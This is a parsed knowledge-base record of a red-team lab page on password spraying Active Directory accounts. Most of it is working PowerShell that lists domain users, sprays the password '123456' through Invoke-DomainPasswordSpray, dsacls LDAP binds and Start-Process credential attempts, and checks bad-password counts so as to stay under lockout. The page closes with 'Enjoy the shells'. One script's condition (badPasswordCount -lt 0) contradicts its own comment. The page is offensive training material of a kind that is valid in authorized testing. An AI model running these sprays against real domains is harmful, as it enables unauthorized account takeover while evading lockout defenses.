---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Active Directory Password Spraying

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-experiments-active-directory-kerberos-abuse-active-directory-password-spraying` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

This lab explores ways of password spraying against Active Directory accounts.

## Preserved Body

````markdown
This lab explores ways of password spraying against Active Directory accounts.

## Invoke-DomainSpray
```csharp
Get-ADUser -Properties name -Filter * | Select-Object -ExpandProperty name |  Out-File users.txt
type users.txt
```
![](<../../_assets/Screenshot from 2019-03-20 21-29-13.png>)
```csharp
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
![](<../../_assets/Screenshot from 2019-03-20 21-32-37.png>)

## Spraying using dsacls

While I was poking around with dsacls for enumerating AD object permissions
[using-dsacls-to-check-ad-object-permissions.md](using-dsacls-to-check-ad-object-permissions.md)
I noticed that one could attempt to bind to LDAP using specific AD credentials, so a dirty AD password spraying POC came about:
```csharp
$domain = ((cmd /c set u)[-3] -split "=")[-1]
$pdc = ((nltest.exe /dcname:$domain) -split "\\\\")[1]
$lockoutBadPwdCount = ((net accounts /domain)[7] -split ":" -replace " ","")[1]
$password = "123456"

# (Get-Content users.txt)
"krbtgt","spotless" | % {
    $badPwdCount = Get-ADObject -SearchBase "cn=$_,cn=users,dc=$domain,dc=local" -Filter * -Properties badpwdcount -Server $pdc | Select-Object -ExpandProperty badpwdcount
    if ($badPwdCount -lt $lockoutBadPwdCount - 3) {
        $isInvalid = dsacls.exe "cn=domain admins,cn=users,dc=offense,dc=local" /user:$_@offense.local /passwd:$password | select-string -pattern "Invalid Credentials"
        if ($isInvalid -match "Invalid") {
            Write-Host "[-] Invalid Credentials for $_ : $password" -foreground red
        } else {
            Write-Host "[+] Working Credentials for $_ : $password" -foreground green
        }        
    }
}
```
![](<../../_assets/Screenshot from 2019-03-20 00-10-10.png>)

## Spraying with Start-Process

Similarly to dsacls, it's possible to spray passwords with `Start-Process` cmdlet and the help of PowerView's cmdlets:
```csharp
# will spray only users that currently have 0 bad password attempts
# dependency - powerview

function Get-BadPasswordCount {
    param(
        $username = "username",
        $domain = "offense.local"
    )
    $pdc = (get-netdomain -domain $domain).PdcRoleOwner
    $badPwdCount = (Get-NetUser $username -Domain $domain -DomainController $pdc.name).badpwdcount
    return $badPwdCount
}

$users = Get-netuser -properties samaccountname | Select-Object -ExpandProperty samaccountname
$domain = "offense.local"
$password = "123456"

Write-Host $users.Count users supplied; $users | % {
    $badPasswordCount = Get-BadPasswordCount -username $_ -Domain $domain
    if ($badPasswordCount -lt 0) {
        Write-Host Spraying : -NoNewline; Write-host -ForegroundColor Green " $_"
        $credentials = New-Object System.Management.Automation.PSCredential -ArgumentList @("$domain\$_",(ConvertTo-SecureString -String $password -AsPlainText -Force))
        Start-Process cmd -Credential ($credentials)
    } else {
        Write-Host "Ignoring $_ with $badPasswordCount badPwdCount" -ForegroundColor Red
    }
}
```
Enjoy the shells:

![](<../../_assets/spraying.gif>)

## References
````

## Source Verification

[source record](../../sources/redteamingtactics/active-directory-password-spraying.md)

## Evidence Excerpt

````text
_asset_filenames:
- Screenshot from 2019-03-20 00-10-10.png
- Screenshot from 2019-03-20 21-29-13.png
- Screenshot from 2019-03-20 21-32-37.png
- spraying.gif
_body: "# Active Directory Password Spraying\n\nThis lab explores ways of password spraying against Active Directory accounts.\n\
\n## Invoke-DomainSpray\n\n{% code title=\"attacker@victim\" %}\n```csharp\nGet-ADUser -Properties name -Filter * | Select-Object\
\ -ExpandProperty name |  Out-File users.txt\ntype users.txt\n```\n{% endcode %}\n\n![](<../../.gitbook/assets/Screenshot\
````
